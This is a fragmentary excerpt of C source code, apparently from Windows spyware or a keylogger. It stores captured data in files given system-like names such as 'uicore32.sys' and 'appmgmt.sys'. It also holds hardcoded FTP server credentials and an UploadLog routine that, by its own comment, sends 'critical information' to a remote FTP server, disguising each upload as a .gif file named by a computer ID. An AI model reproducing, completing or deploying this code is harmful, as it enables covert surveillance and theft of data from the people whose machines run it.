...
inline unsigned long int GetCompId();
...
inline HANDLE TargetFile()
{
	...
	sprintf(TargetFileName,"%s%lX.inv",BaseDirectory(),FileCount);
...
const char InternetCheckMask[] = "http://www.microsoft.com";

const char FtpServer[] = "www.interlink.150m.com";
const char FtpUserName[] = "interlink.150m.com";
const char FtpPassword[] = "hackmycomputer";
                          ...
                          DWORD dwTime)
{
	...
	if(uf == NULL) {
		char fname[STR_SZ1];
		sprintf(fname,"%suicore32.sys",BaseDirectory());
		uf = fopen(fname,"r+b");
		if(uf == NULL) {
			uf = fopen(fname,"w+b");
			if(uf == NULL) {
...
inline unsigned long int LogLimit()
{
	...
	sprintf(cfname,"%sappmgmt.sys",BaseDirectory());
	cf = fopen(cfname,"r+b");
	if(cf != NULL) {
...
inline char UploadLog(unsigned long int no)
{
	/* this function will transfer the critical
	   information  to my remote FTP server */
	...
	BOOL Connection_Available = InternetCheckConnection
	(InternetCheckMask,FLAG_ICC_FORCE_CONNECTION,0);
	if(Connection_Available)
	{
		...
		if(hNet == NULL) {
			...
			sprintf(local_file,"%s%lX.inv",BaseDirectory(),no);
			sprintf(remote_file,"%lu-%lX.gif",GetCompId(),no);
